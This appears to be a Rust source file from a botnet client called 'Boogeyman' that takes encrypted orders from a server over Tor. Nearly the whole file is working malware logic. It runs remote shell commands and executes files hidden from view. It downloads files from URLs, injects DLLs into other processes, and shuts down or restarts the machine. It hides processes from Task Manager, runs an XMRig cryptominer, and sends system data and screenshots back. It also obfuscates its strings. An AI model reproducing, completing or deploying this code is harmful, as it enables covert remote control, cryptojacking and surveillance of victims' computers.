use std::{ os::windows::process::CommandExt, path::PathBuf, process::Command, sync::Arc };
use anyhow::{ Context, Result };
use client_vars::{
    constants::client_version,
    types::{
        receive::{ self, BoogeymanReceivePayload, ClientParams },
        send::{ self, BoogeymanSendPayload, InitParams, ServerAction, ServerParams },
        structs::BotState,
    },
};
use shared::{
    constants::communication_encryption_key,
    network::tor::{ LoggerCnfg, MutexPtr, RwPtr, SrvRcvTp, TrHandler },
    utils::{
        encryption::{ convert_key_to_bytes, sauron_decrypt },
        functions::{ restart_pc_instant, shutdown_pc_instant, write_file_to_random_folder },
    },
};
use obfstr::obfstr as s;
use tokio::sync::{ Mutex, RwLock };
use crate::{
    miner::manager::MinerManager,
    tasks::task_manager_hook::{ inject_dll, update_query_hooker_list },
    utils::{
        system_info::{ generate_bot_state, get_dynamic_info, get_thumbnail },
        terminal::Terminal,
    },
};
use super::basic::{
    download_file_to_path,
    get_xmrig_config,
    get_xmrig_summary,
    override_xmrig_config,
};

#[derive(Clone)]
pub struct BotHandler {
    tr_handler: TrHandler,
    bot_state: RwPtr<BotState>,
    terminal: Option<MutexPtr<Terminal>>,
    miner_manager: RwPtr<MinerManager>,
}

impl BotHandler {
    pub async fn new(miner_ref: Arc<RwLock<MinerManager>>) -> Result<Self> {
        // println!("making tor handler");
        let tor_handler = TrHandler::new().await?;
        // println!("generate_bot_state");

        let bot_state = generate_bot_state().await;
        // println!("Terminal");

        let terminal = match Terminal::new() {
            Ok(terminal) => { Some(Arc::new(Mutex::new(terminal))) }
            Err(error) => {
                // eprintln!("error getting terminal: {}", error);
                None
            }
        };

        Ok(BotHandler {
            miner_manager: miner_ref,
            tr_handler: tor_handler,
            bot_state: Arc::new(RwLock::new(bot_state)),
            terminal,
        })
    }
    pub async fn run_handler(&mut self) {
        let self_clone = Arc::new(RwLock::new(self.clone()));
        self.tr_handler.run::<_, _, BotHandler>(
            self_clone,
            Self::receive_data,
            Self::connect_callback_init
        ).await;
    }
    fn receive_data(self_ref: RwPtr<Self>, raw_data: Vec<u8>) {
        tokio::task::spawn(async move {
            if
                let Ok(decrypted_data) = sauron_decrypt(
                    convert_key_to_bytes(&communication_encryption_key()),
                    &raw_data
                )
            {
                if let Err(error) = Self::process_data(decrypted_data, self_ref).await {
                    //? HONESTLY THIS ERROR VERY IMPORTANT WE SHOULD REPORT IT TO SERVER VIA DEFAULT ERROR type
                    // eprintln!("Failed to process data via callback: {}", error);
                };
            }
        });
    }
    fn connect_callback_init(self_ref: RwPtr<Self>) {
        // println!("connect callback");
        tokio::task::spawn(async move {
            let self_guard = self_ref.read().await;
            let params = InitParams { bot_state: self_guard.bot_state.read().await.clone() };
            drop(self_guard);
            if
                let Err(error) = Self::send_data(
                    self_ref.clone(),
                    ServerAction::Init,
                    ServerParams::Init(params)
                ).await
            {
                // eprintln!("Failed to send data: {}", error);
            }
        });
    }

    async fn process_data(binary_data: Vec<u8>, self_ref: RwPtr<Self>) -> Result<()> {
        let processed_data: BoogeymanReceivePayload = serde_json
            ::from_slice(&binary_data)
            .context(s!("Failed to parse binary data as LoaderReceivePayload").to_string())?;

        Self::route_data(processed_data, self_ref).await
    }

    async fn route_data(
        processed_data: BoogeymanReceivePayload,
        self_ref: RwPtr<Self>
    ) -> Result<()> {
        // println!("routing data: {:#?}", processed_data);
        match processed_data.action {
            receive::ClientAction::UninstallSelf => {}
            receive::ClientAction::UpdateSelf => {}
            receive::ClientAction::CallTerminalCommand => {
                if let ClientParams::CallTerminalCommand(params) = processed_data.params {
                    if let Some(terminal_ref) = &self_ref.read().await.terminal {
                        let mut terminal = terminal_ref.lock().await;

                        let data = match terminal.execute(&params.command) {
                            Ok(data) => {
                                // println!("{:#?}", data);

                                send::TerminalOutputParams { output: Some(data), error: None }
                            }
                            Err(error) =>
                                send::TerminalOutputParams {
                                    output: None,
                                    error: Some(format!("{:#?}", error)),
                                },
                        };

                        drop(terminal);
                        Self::send_data(
                            self_ref.clone(),
                            ServerAction::TerminalOutput,
                            ServerParams::TerminalOutput(data)
                        ).await?;
                    } else {
                        return Err(anyhow::anyhow!(s!("Terminal not initialized").to_string()));
                    }
                } else {
                    return Err(
                        anyhow::anyhow!(
                            format!("{}{:#?}", s!("Invalid params for: "), processed_data.action)
                        )
                    );
                }
            }
            receive::ClientAction::DownloadAndExecFileInMemory => {}
            receive::ClientAction::FetchLogs => {
                // all the log folders - just read each file in them - store a map of filename - data

                // load bytes - split by b"\r\n\r\n"
                // decrypt each split, convert into parsed

                // parsed will be - date, tag, content - ordered all strings
                // then just send like 5 maps of that

                // and the fetch params will simply be bools of which to get, and also timedate range of which to include

            }
            receive::ClientAction::CompressDirAndSend => {}
            receive::ClientAction::CallSysEvent => {
                if let ClientParams::CallSysEvent(params) = processed_data.params {
                    match params.event {
                        receive::SysEvent::Shutdown => {
                            shutdown_pc_instant()?;
                        }
                        receive::SysEvent::Restart => {
                            restart_pc_instant()?;
                        }
                    }
                } else {
                    return Err(
                        anyhow::anyhow!(
                            format!("{}{:#?}", s!("Invalid params for: "), processed_data.action)
                        )
                    );
                }
            }
            receive::ClientAction::FetchDynamicData => {
                if let ClientParams::FetchDynamicData(_params) = processed_data.params {
                    let dynamic_info = get_dynamic_info();
                    let clone = self_ref.clone();
                    let lock = clone.read().await;
                    let mut bot_state: tokio::sync::RwLockWriteGuard<
                        '_,
                        BotState
                    > = lock.bot_state.write().await;
                    bot_state.dynamic_info = dynamic_info.clone();
                    drop(bot_state);
                    drop(lock);

                    let data = send::UpdateDynamicDataParams { dynamic_info };

                    Self::send_data(
                        self_ref,
                        ServerAction::UpdateDynamicData,
                        ServerParams::UpdateDynamicData(data)
                    ).await?;
                } else {
                    return Err(
                        anyhow::anyhow!(
                            format!("{}{:#?}", s!("Invalid params for: "), processed_data.action)
                        )
                    );
                }
            }
            receive::ClientAction::FetchThumbnail => {
                if let ClientParams::FetchThumbnail(_params) = processed_data.params {
                    let thumbnail = get_thumbnail().map(Some).unwrap_or(None);
                    let clone = self_ref.clone();
                    let lock = clone.read().await;
                    let mut bot_state: tokio::sync::RwLockWriteGuard<
                        '_,
                        BotState
                    > = lock.bot_state.write().await;
                    bot_state.thumbnail = thumbnail.clone();
                    drop(bot_state);
                    drop(lock);
                    let data = send::UpdateThumbnailParams { thumbnail };

                    Self::send_data(
                        self_ref,
                        ServerAction::UpdateThumbnail,
                        ServerParams::UpdateThumbnail(data)
                    ).await?;
                } else {
                    return Err(
                        anyhow::anyhow!(
                            format!("{}{:#?}", s!("Invalid params for: "), processed_data.action)
                        )
                    );
                }
            }
            receive::ClientAction::UpdateTaskManagerExclusions => {
                if let ClientParams::UpdateTaskManagerExclusions(params) = processed_data.params {
                    update_query_hooker_list(params)?;
                } else {
                    return Err(
                        anyhow::anyhow!(
                            format!("{}{:#?}", s!("Invalid params for: "), processed_data.action)
                        )
                    );
                }
            }
            receive::ClientAction::ExecLocalFile => {
                if let ClientParams::ExecLocalFile(params) = processed_data.params {
                    let mut program = Command::new(params.abs_path);
                    if params.hidden {
                        program.creation_flags(0x08000000); // CREATE_NO_WINDOW flag
                    }
                    if let Some(args) = params.args {
                        program.raw_arg(format!(" {}", args));
                    }
                    if params.wait_for_output {
                        let output = program
                            .output()
                            .context(s!("Failed to get output from ExecFile").to_string())?;

                        let data = send::ExecFileOutputParams {
                            status: output.status.code(),
                            stdout: output.stdout,
                            stderr: output.stderr,
                        };

                        Self::send_data(
                            self_ref,
                            ServerAction::ExecFileOutput,
                            ServerParams::ExecFileOutput(data)
                        ).await?;
                    } else {
                        program.spawn().context(s!("Failed to ExecFile").to_string())?;
                    }
                } else {
                    return Err(
                        anyhow::anyhow!(
                            format!("{}{:#?}", s!("Invalid params for: "), processed_data.action)
                        )
                    );
                }
            }
            receive::ClientAction::EditXMRigConfig => {
                if let ClientParams::EditXMRigConfig(params) = processed_data.params {
                    override_xmrig_config(params.config).await?;
                } else {
                    return Err(
                        anyhow::anyhow!(
                            format!("{}{:#?}", s!("Invalid params for: "), processed_data.action)
                        )
                    );
                }
            }
            receive::ClientAction::DownloadFile => {
                if let ClientParams::DownloadFile(params) = processed_data.params {
                    let path = PathBuf::from(params.abs_path);
                    if let Some(bytes) = params.from_bytes {
                        std::fs::write(path, bytes)?;
                    } else if let Some(url) = params.from_url {
                        futures::executor::block_on(async {
                            let _ = download_file_to_path(&url, path).await;
                            // handle error
                        });
                    }

                    // send output if fail
                    // let data = send::UpdateThumbnailParams { thumbnail: get_thumbnail()? };

                    // Self::send_data(
                    //     tor_handler,
                    //     ServerAction::UpdateThumbnail,
                    //     ServerParams::UpdateThumbnail(data)
                    // )?;
                } else {
                    return Err(
                        anyhow::anyhow!(
                            format!("{}{:#?}", s!("Invalid params for: "), processed_data.action)
                        )
                    );
                }
            }
            receive::ClientAction::InjectDll => {
                if let ClientParams::InjectDll(params) = processed_data.params {
                    let dll_path = write_file_to_random_folder(s!("data.dll"), &params.dll_bytes)?;
                    inject_dll(params.pid, dll_path.to_str().unwrap())?;
                    // send output if fail
                    // let data = send::UpdateThumbnailParams { thumbnail: get_thumbnail()? };

                    // Self::send_data(
                    //     tor_handler,
                    //     ServerAction::UpdateThumbnail,
                    //     ServerParams::UpdateThumbnail(data)
                    // )?;
                } else {
                    return Err(
                        anyhow::anyhow!(
                            format!("{}{:#?}", s!("Invalid params for: "), processed_data.action)
                        )
                    );
                }
            }
            receive::ClientAction::GetXMRigData => {
                if let ClientParams::GetXMRigData(_params) = processed_data.params {
                    let config = get_xmrig_config().await?;
                    let summary = get_xmrig_summary().await?;
                    let data = send::XMRigConfigParams { config, summary };

                    Self::send_data(
                        self_ref.clone(),
                        ServerAction::XMRigConfig,
                        ServerParams::XMRigConfig(data)
                    ).await?;
                } else {
                    return Err(
                        anyhow::anyhow!(
                            format!("{}{:#?}", s!("Invalid params for: "), processed_data.action)
                        )
                    );
                }
            }
            receive::ClientAction::EditMinerCPULimit => {
                if let ClientParams::EditMinerCPULimit(params) = processed_data.params {
                    self_ref
                        .read().await
                        .miner_manager.write().await
                        .modify_cpu_limit(params.new_cpu_limit).await?;
                } else {
                    return Err(
                        anyhow::anyhow!(
                            format!("{}{:#?}", s!("Invalid params for: "), processed_data.action)
                        )
                    );
                }
            }
        }
        Ok(())
    }
    async fn send_data(
        self_ref: RwPtr<Self>,
        action: ServerAction,
        params: ServerParams
    ) -> Result<()> {
        // println!("SENDING DATA: {:#?}, {:#?}", action, params);
        let tor_h = &self_ref.read().await.tr_handler;

        let payload = BoogeymanSendPayload {
            id: tor_h.dv_id.read().await.to_owned(),
            version: client_version(),
            action,
            params,
        };

        let binary_data = serde_json
            ::to_vec(&payload)
            .context(s!("Failed to serialize ServerReceive struct to binary data").to_string())?;

        tor_h.add_to_send_queue(SrvRcvTp::Bgm, binary_data).await
    }
}
